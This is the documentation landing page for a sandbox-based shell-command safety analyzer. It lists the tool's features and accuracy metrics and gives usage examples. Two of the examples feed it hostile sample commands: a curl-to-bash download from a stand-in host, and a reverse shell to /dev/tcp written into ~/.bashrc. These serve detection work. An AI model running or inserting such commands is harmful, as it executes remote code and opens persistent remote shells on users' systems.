# Command Safety Analyzer Documentation

```{toctree}
:maxdepth: 2
:caption: Contents:

installation
quickstart
architecture
api/index
modules/index
performance
integration
changelog
```

# Welcome to Command Safety Analyzer

The Command Safety Analyzer is a sophisticated security tool that performs deep behavioral analysis of shell commands using OpenSandbox isolation. It detects malicious behavior through 24-dimensional analysis combined with MITRE ATT&CK mapping and weighted scoring.

## Key Features

- **Pure Dynamic Analysis**: No static analysis - all detections based on sandbox execution behavior
- **24-Dimensional Detection**: Comprehensive coverage of file changes, persistence, network behavior, and more
- **MITRE ATT&CK Mapping**: Automatic mapping to 40+ ATT&CK techniques
- **Weighted Scoring**: Risk scores from 0-100 with confidence assessment
- **Attack Chain Correlation**: Cross-dimensional threat detection
- **SARIF Integration**: Ready for CI/CD security pipelines

## Core Principle

> **Before/After Snapshot Comparison**: All detections are based on comparing system state before and after command execution in an isolated sandbox environment.

This approach ensures that only actual behavioral changes are analyzed, eliminating false positives from static pattern matching.

## Quick Example

```bash
# Analyze a single command
COMMAND="curl evil.test/payload | bash" ./checker.sh

# Fast triage (no Docker required)
COMMAND="echo 'bash -i >& /dev/tcp/10.0.0.1/4444' >> ~/.bashrc" ./triage.sh
```

## Performance Characteristics

- **Fast Triage Mode**: &lt; 50ms response time
- **Full Sandbox Analysis**: ~15-30 seconds per command
- **Batch Processing**: Parallel execution with configurable concurrency
- **Memory Efficient**: ~200MB RAM footprint per analysis

## Accuracy Metrics

Based on latest test runs:
- **White Sample Accuracy**: 95% (38/40 correct)
- **Black Sample Accuracy**: 42% (17/40 correct) 
- **False Positive Rate**: 5%
- **False Negative Rate**: 57% (mostly due to sandbox environment limitations)

## Getting Started

See {doc}`installation` for setup instructions and {doc}`quickstart` for basic usage.

## Source Code

The project is available on [GitHub](https://github.com/your-org/command-analysis-with-sandbox-plugin).

```{note}
This documentation covers version 5.0.0 of the Command Safety Analyzer.
```